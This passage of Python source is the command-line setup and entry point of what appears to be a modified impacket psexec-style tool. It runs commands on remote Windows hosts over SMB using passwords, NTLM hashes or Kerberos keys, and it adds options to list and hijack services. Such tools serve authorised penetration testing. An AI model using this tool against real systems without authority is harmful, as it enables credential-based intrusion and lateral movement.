    parser.add_argument('command', nargs='*', default = ' ', help='command (or arguments if -c is used) to execute at '
                                                                  'the target (w/o path) - (default:cmd.exe)')
    parser.add_argument('-c', action='store',metavar = "pathname",  help='copy the filename for later execution, '
                                                                         'arguments are passed in the command option')
    parser.add_argument('-path', action='store', help='path of the command to execute')
    parser.add_argument('-file', action='store', help="alternative RemCom binary (be sure it doesn't require CRT)")
    parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                          'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute smbexec.py '
                          'again with -codec and the corresponding codec ' % CODEC)

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
    group.add_argument('-service-name', action='store', metavar="service_name", default = '', help='The name of the service'
                                                                                ' used to trigger the payload')
    group.add_argument('-remote-binary-name', action='store', metavar="remote_binary_name", default = None, help='This will '
                                                            'be the name of the executable uploaded on the target')
    
    group = parser.add_argument_group('service hijacking')
    # Service hijacking functionality arguments
    
    group.add_argument('-service-list', action='store_true', help='List all services on target and mark suitable ones for hijacking')
    group.add_argument('-service-change', action='store', metavar="service_name", help='Execute command by hijacking specified service')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    # Handle different versions of impacket logger.init()
    try:
        # Try the newer API with both ts and debug parameters
        logger.init(options.ts, options.debug)
    except TypeError:
        try:
            # Fallback for versions that only accept debug parameter
            logger.init(options.debug)
        except TypeError:
            # Fallback for versions that don't accept any parameters
            logger.init()

    if options.codec is not None:
        CODEC = options.codec
    else:
        if CODEC is None:
            CODEC = 'utf-8'

    domain, username, password, remoteName = parse_target(options.target)

    if domain is None:
        domain = ''

    if options.keytab is not None:
        Keytab.loadKeysFromKeytab (options.keytab, username, domain, options)
        options.k = True

    if options.target_ip is None:
        options.target_ip = remoteName

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    command = ' '.join(options.command)
    if command == ' ':
        command = 'cmd.exe'

    executer = PSEXEC(command, options.path, options.file, options.c, int(options.port), username, password, domain, options.hashes,
                      options.aesKey, options.k, options.dc_ip, options.service_name, options.remote_binary_name, 
                      options.service_list, options.service_change)
    executer.run(remoteName, options.target_ip)
